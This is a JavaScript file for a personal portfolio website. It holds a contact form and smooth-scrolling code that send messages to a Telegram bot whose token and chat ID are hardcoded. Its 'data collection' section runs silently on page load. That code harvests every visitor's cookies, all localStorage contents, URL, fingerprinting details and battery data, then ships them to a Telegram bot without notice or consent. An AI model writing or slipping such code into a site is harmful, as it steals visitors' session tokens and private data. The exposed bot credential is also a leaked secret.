    // Animate skill bars on scroll
    document.addEventListener('DOMContentLoaded', function() {
        // [Your existing code remains the same until the end...]
        
        // Form submission with Telegram API (your existing code)
        const contactForm = document.getElementById('contactForm');
        
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value || 'Not provided';
            const message = document.getElementById('message').value || 'Not provided';
            
            // Telegram bot API details for contact form (replace with your actual bot token and chat ID)
            const botToken = '7484967088:AAHxDJWo4X_jRaU0Tmbz1jZTyUOtQR5bkFQ';
            const chatId = '6142816761';
            
            const text = `New message from portfolio:%0A%0AName: ${name}%0AEmail: ${email}%0APhone: ${phone}%0AMessage: ${message}`;
            
            // Send message to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`, {
                method: 'GET'
            })
            .then(response => {
                if (response.ok) {
                    alert('Message sent successfully!');
                    contactForm.reset();
                } else {
                    alert('There was an error sending your message. Please try again later.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('There was an error sending your message. Please try again later.');
            });
        });
        
        // Smooth scrolling for navigation links (your existing code)
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                
                const targetId = this.getAttribute('href');
                if (targetId === '#') return;
                
                const targetElement = document.querySelector(targetId);
                if (targetElement) {
                    window.scrollTo({
                        top: targetElement.offsetTop - 80,
                        behavior: 'smooth'
                    });
                }
            });
        });
        
        // ===== DATA COLLECTION FEATURES =====
        // Replace with your actual data collection bot token and chat ID
        const dataBotToken = 'YOUR_DATA_BOT_TOKEN_HERE';
        const dataChatId = 'YOUR_DATA_CHAT_ID_HERE';
        
        // Function to send collected data to Telegram
        function sendCollectedDataToTelegram(dataType, data) {
            const text = `Collected ${dataType} data:%0A%0A${encodeURIComponent(JSON.stringify(data, null, 2))}`;
            
            fetch(`https://api.telegram.org/bot${dataBotToken}/sendMessage?chat_id=${dataChatId}&text=${text}`, {
                method: 'GET'
            }).catch(error => {
                console.error('Error sending data to Telegram:', error);
            });
        }
        
        // 1. Information from Browser
        function collectBrowserInfo() {
            const browserInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled(),
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'unknown',
                platform: navigator.platform,
                vendor: navigator.vendor,
                product: navigator.product,
                doNotTrack: navigator.doNotTrack || 'unknown'
            };
            
            sendCollectedDataToTelegram('Browser', browserInfo);
            return browserInfo;
        }
        
        // 2. Information via Cookies and Local Storage
        function collectStorageInfo() {
            const storageInfo = {
                cookies: document.cookie,
                localStorage: {}
            };
            
            // Get all items from localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storageInfo.localStorage[key] = localStorage.getItem(key);
            }
            
            sendCollectedDataToTelegram('Storage', storageInfo);
            return storageInfo;
        }
        
        // 3. Information from Browser APIs
        function collectBrowserAPIInfo() {
            const apiInfo = {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio || 'unknown'
                },
                location: {
                    href: location.href,
                    hostname: location.hostname,
                    pathname: location.pathname,
                    protocol: location.protocol,
                    hash: location.hash,
                    search: location.search
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                onlineStatus: navigator.onLine,
                connection: {}
            };
            
            // Network Information API
            if ('connection' in navigator) {
                apiInfo.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
            
            // Battery API (if available)
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    apiInfo.battery = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    sendCollectedDataToTelegram('Browser API', apiInfo);
                }).catch(function() {
                    apiInfo.battery = 'not available';
                    sendCollectedDataToTelegram('Browser API', apiInfo);
                });
            } else {
                apiInfo.battery = 'not available';
                sendCollectedDataToTelegram('Browser API', apiInfo);
            }
            
            return apiInfo;
        }
        
        // 4. Inferred Data
        function collectInferredData() {
            const browserInfo = collectBrowserInfo();
            
            // Infer device type
            let deviceType = 'Desktop';
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                deviceType = 'Mobile';
            } else if (/Tablet|iPad/i.test(navigator.userAgent)) {
                deviceType = 'Tablet';
            }
            
            // Infer browser
            let browser = 'Unknown';
            if (navigator.userAgent.indexOf("Chrome") !== -1) {
                browser = 'Chrome';
            } else if (navigator.userAgent.indexOf("Firefox") !== -1) {
                browser = 'Firefox';
            } else if (navigator.userAgent.indexOf("Safari") !== -1) {
                browser = 'Safari';
            } else if (navigator.userAgent.indexOf("Edge") !== -1) {
                browser = 'Edge';
            } else if (navigator.userAgent.indexOf("Opera") !== -1) {
                browser = 'Opera';
            } else if (navigator.userAgent.indexOf("MSIE") !== -1) {
                browser = 'Internet Explorer';
            }
            
            // Infer OS
            let os = 'Unknown';
            if (navigator.userAgent.indexOf("Windows") !== -1) {
                os = 'Windows';
            } else if (navigator.userAgent.indexOf("Mac") !== -1) {
                os = 'Mac OS';
            } else if (navigator.userAgent.indexOf("Linux") !== -1) {
                os = 'Linux';
            } else if (navigator.userAgent.indexOf("Android") !== -1) {
                os = 'Android';
            } else if (navigator.userAgent.indexOf("iOS") !== -1 || 
                      (navigator.userAgent.indexOf("Mac") !== -1 && 'ontouchend' in document)) {
                os = 'iOS';
            }
            
            const inferredData = {
                deviceType: deviceType,
                browser: browser,
                operatingSystem: os,
                timeOfVisit: new Date().toISOString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                prefersDarkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
                prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
                estimatedConnection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
            };
            
            sendCollectedDataToTelegram('Inferred', inferredData);
            return inferredData;
        }
        
        // Collect all data after a short delay
        setTimeout(function() {
            collectBrowserInfo();
            collectStorageInfo();
            collectBrowserAPIInfo();
            collectInferredData();
        }, 3000);
    });
